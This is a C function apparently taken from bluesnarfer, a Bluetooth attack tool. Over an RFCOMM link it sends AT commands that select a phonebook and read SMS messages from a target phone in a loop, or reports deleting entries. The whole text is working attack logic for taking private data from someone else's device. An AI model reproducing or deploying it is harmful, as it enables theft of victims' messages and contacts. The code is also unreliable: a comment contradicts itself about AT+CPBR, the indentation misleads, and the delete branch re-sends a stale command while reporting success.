int rw_sms(FILE *fd, struct opt options) {

	char buffer[32];
	char *ptr, *tptr;

	if (!options.phonebook) {

		fwrite(DEFAULTPB, strlen(DEFAULTPB), 1, fd);

		rfcomm_read(fd, DEFAULTPB);
	} else {

		printf("custom phonebook selected\n");
		snprintf(buffer, 32, "AT+CPBS=\"%s\"\r\n", options.phonebook);
		fwrite(buffer, strlen(buffer), 1, fd);

		rfcomm_read(fd, buffer);
	}

	do {

		if (options.act == MESS)
			snprintf(buffer, 32, "AT+CMGR=%d\r\n", options.N_MIN); //AT+CPBR= means it ment to read ! AT+CPBR= means WRITE

			if (!fwrite(buffer, strlen(buffer), 1, fd)) {

			fprintf(stderr, "bluesnarfer: write, %s",
					strerror(errno));
			return -1;
		}

		if (options.act == MESS) {

			if (!(ptr = rfcomm_read(fd, buffer))) {

				fprintf(stderr,
						"bluesnarfer: rfcomm_read failed\n");
				return -1;
			}

			if (tptr = parse(ptr)) {

				printf("%s\n", tptr);
				free(tptr);
			}
		} else {

			if (!rfcomm_read(fd, buffer)) {

				fprintf(stderr,
						"bluesnarfer: rfcomm_read failed\n");
				return -1;
			}

			printf("delete of entry %d successfull\n",
					options.N_MIN);
		}

		options.N_MIN++;

	} while (options.N_MIN <= options.N_MAX);

	return 0;
}
